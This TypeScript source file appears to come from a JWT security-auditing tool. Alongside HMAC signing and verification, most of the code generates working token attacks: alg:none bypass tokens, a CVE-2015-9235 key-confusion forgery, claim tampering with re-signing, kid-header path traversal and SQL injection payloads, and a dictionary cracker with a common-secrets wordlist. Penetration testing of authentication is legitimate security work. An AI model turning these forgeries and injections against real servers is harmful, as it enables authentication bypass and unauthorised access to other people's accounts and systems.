/**
 * Sentinel JWT Engine — WebCrypto RFC 7519 / RFC 7515 Engine
 *
 * Implements real cryptographic signing, verification, algorithm manipulation,
 * and vulnerability auditing (e.g. Algorithm None, CVE-2015-9235 Key Confusion).
 */

// ─── Base64URL Helpers ──────────────────────────────────────────────────────

export function base64UrlEncode(str: string): string {
  try {
    const bytes = new TextEncoder().encode(str);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  } catch {
    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }
}

export function base64UrlEncodeBytes(bytes: Uint8Array): string {
  let binary = '';
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

export function base64UrlDecode(str: string): string {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) {
    base64 += '=';
  }
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

export function base64UrlDecodeToBytes(str: string): Uint8Array {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  while (base64.length % 4) {
    base64 += '=';
  }
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

// ─── WebCrypto Signing & Verification ───────────────────────────────────────

export type HmacAlgorithm = 'HS256' | 'HS384' | 'HS512';

const ALG_HASH_MAP: Record<HmacAlgorithm, string> = {
  HS256: 'SHA-256',
  HS384: 'SHA-384',
  HS512: 'SHA-512',
};

/**
 * Signs data using WebCrypto HMAC
 */
export async function signHmac(
  data: string,
  secret: string | Uint8Array,
  alg: HmacAlgorithm = 'HS256'
): Promise<string> {
  const hashName = ALG_HASH_MAP[alg] || 'SHA-256';
  const secretKeyBytes = typeof secret === 'string' ? new TextEncoder().encode(secret) : secret;

  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    secretKeyBytes as unknown as BufferSource,
    { name: 'HMAC', hash: { name: hashName } },
    false,
    ['sign', 'verify']
  );

  const dataBytes = new TextEncoder().encode(data);
  const signatureBuffer = await crypto.subtle.sign('HMAC', cryptoKey, dataBytes);
  return base64UrlEncodeBytes(new Uint8Array(signatureBuffer));
}

/**
 * Verifies HMAC signature on a full JWT string
 */
export async function verifyHmacJwt(
  jwt: string,
  secret: string | Uint8Array
): Promise<{ valid: boolean; error?: string }> {
  const parts = jwt.trim().split('.');
  if (parts.length !== 3) {
    return { valid: false, error: 'Malformed JWT (must contain 3 parts: header.payload.signature)' };
  }

  const [headerB64, payloadB64, signatureB64] = parts;
  let header: { alg?: string };
  try {
    header = JSON.parse(base64UrlDecode(headerB64));
  } catch {
    return { valid: false, error: 'Malformed header JSON' };
  }

  const alg = (header.alg || 'HS256').toUpperCase() as HmacAlgorithm;
  if (!ALG_HASH_MAP[alg]) {
    return { valid: false, error: `Unsupported or asymmetric algorithm for direct HMAC verification: ${header.alg}` };
  }

  const signingInput = `${headerB64}.${payloadB64}`;
  const expectedSignature = await signHmac(signingInput, secret, alg);

  if (signatureB64 === expectedSignature) {
    return { valid: true };
  }

  return { valid: false, error: 'Signature mismatch' };
}

// ─── Token Attack Generators ────────────────────────────────────────────────

export interface JwtAttackResult {
  attackName: string;
  modifiedJwt: string;
  explanation: string;
}

/**
 * Generates an 'alg': 'none' bypass token with stripped signature.
 * (Variations: "none", "None", "NONE", "nOnE")
 */
export function generateAlgNoneTokens(
  headerJson: string,
  payloadJson: string
): JwtAttackResult[] {
  const parsedHeader = JSON.parse(headerJson);
  const encodedPayload = base64UrlEncode(payloadJson);

  const variations = ['none', 'None', 'NONE'];
  return variations.map((variant) => {
    const modifiedHeader = { ...parsedHeader, alg: variant };
    const encodedHeader = base64UrlEncode(JSON.stringify(modifiedHeader));
    // Notice trailing dot without signature: header.payload.
    const token = `${encodedHeader}.${encodedPayload}.`;
    return {
      attackName: `Algorithm None Attack (${variant})`,
      modifiedJwt: token,
      explanation: `Forces algorithm to '${variant}' and removes signature segment. Tests servers accepting unverified tokens.`,
    };
  });
}

/**
 * CVE-2015-9235 Key Confusion Attack
 * Re-signs an RS256 token using HMAC-SHA256, where the secret key is the target server's public RSA key (PEM or raw bytes).
 */
export async function generateKeyConfusionToken(
  headerJson: string,
  payloadJson: string,
  publicKeyPem: string
): Promise<JwtAttackResult> {
  const parsedHeader = JSON.parse(headerJson);
  const modifiedHeader = { ...parsedHeader, alg: 'HS256' };

  const encodedHeader = base64UrlEncode(JSON.stringify(modifiedHeader));
  const encodedPayload = base64UrlEncode(payloadJson);
  const signingInput = `${encodedHeader}.${encodedPayload}`;

  // Clean public key to raw bytes
  const cleanPem = publicKeyPem.trim();
  const signature = await signHmac(signingInput, cleanPem, 'HS256');

  return {
    attackName: 'Key Confusion Attack (CVE-2015-9235 RS256 -> HS256)',
    modifiedJwt: `${signingInput}.${signature}`,
    explanation:
      'Switches alg from RS256 to HS256 and signs with public key PEM as the HMAC secret. Vulnerable servers will verify the signature using their public key file.',
  };
}

/**
 * Modifies specific payload claims (e.g. role, admin, user ID) and re-signs
 */
export async function tamperAndSign(
  headerJson: string,
  payloadJson: string,
  claimOverrides: Record<string, any>,
  secret: string
): Promise<string> {
  const parsedHeader = JSON.parse(headerJson);
  const parsedPayload = { ...JSON.parse(payloadJson), ...claimOverrides };

  const encodedH = base64UrlEncode(JSON.stringify(parsedHeader));
  const encodedP = base64UrlEncode(JSON.stringify(parsedPayload));
  const signingInput = `${encodedH}.${encodedP}`;

  const alg = (parsedHeader.alg || 'HS256').toUpperCase() as HmacAlgorithm;
  const signature = await signHmac(signingInput, secret, alg);
  return `${signingInput}.${signature}`;
}

/**
 * Generates Key ID (kid) Header Injection Attacks
 * 1. Directory traversal to /dev/null (signed with empty secret "")
 * 2. SQL injection in kid parameter (signed with known canary secret)
 */
export async function generateKidInjectionTokens(
  headerJson: string,
  payloadJson: string
): Promise<JwtAttackResult[]> {
  const parsedHeader = JSON.parse(headerJson);
  const encodedPayload = base64UrlEncode(payloadJson);
  const results: JwtAttackResult[] = [];

  // Attack 1: /dev/null traversal signed with empty string
  const devNullHeader = { ...parsedHeader, alg: 'HS256', kid: '../../../../../../../../dev/null' };
  const signingInput1 = `${base64UrlEncode(JSON.stringify(devNullHeader))}.${encodedPayload}`;
  const sig1 = await signHmac(signingInput1, '', 'HS256');
  results.push({
    attackName: 'kid Path Traversal (/dev/null)',
    modifiedJwt: `${signingInput1}.${sig1}`,
    explanation:
      'Points kid to /dev/null via directory traversal. If server uses file content as HMAC key, empty string "" verifies.',
  });

  // Attack 2: SQL injection in kid
  const sqliSecret = 'sentinel_injected_secret';
  const sqliHeader = {
    ...parsedHeader,
    alg: 'HS256',
    kid: `key' UNION SELECT '${sqliSecret}'-- -`,
  };
  const signingInput2 = `${base64UrlEncode(JSON.stringify(sqliHeader))}.${encodedPayload}`;
  const sig2 = await signHmac(signingInput2, sqliSecret, 'HS256');
  results.push({
    attackName: 'kid SQL Injection (UNION SELECT)',
    modifiedJwt: `${signingInput2}.${sig2}`,
    explanation:
      `Injects SQL query into kid parameter. If server retrieves key via SQL, signature validates with secret '${sqliSecret}'.`,
  });

  return results;
}

/**
 * Standard wordlist of common JWT HMAC secrets for dictionary recovery
 */
export const COMMON_JWT_SECRETS: string[] = [
  'secret',
  '123456',
  'password',
  'admin',
  'jwt_secret',
  'secret123',
  'supersecret',
  'mysecret',
  'app_secret',
  'development',
  'test',
  'private',
  'key',
  'secretkey',
  'changeme',
  'welcome',
  '1234567890',
  'qwerty',
  'api_secret',
  'token_secret',
  'auth_secret',
];

/**
 * Brute-forces HMAC secret against a candidate wordlist
 */
export async function dictionaryCrackHmac(
  jwtString: string,
  wordlist: string[] = COMMON_JWT_SECRETS
): Promise<string | null> {
  const parts = jwtString.trim().split('.');
  if (parts.length !== 3) return null;

  for (const candidate of wordlist) {
    const res = await verifyHmacJwt(jwtString, candidate);
    if (res.valid) {
      return candidate;
    }
  }

  return null;
}
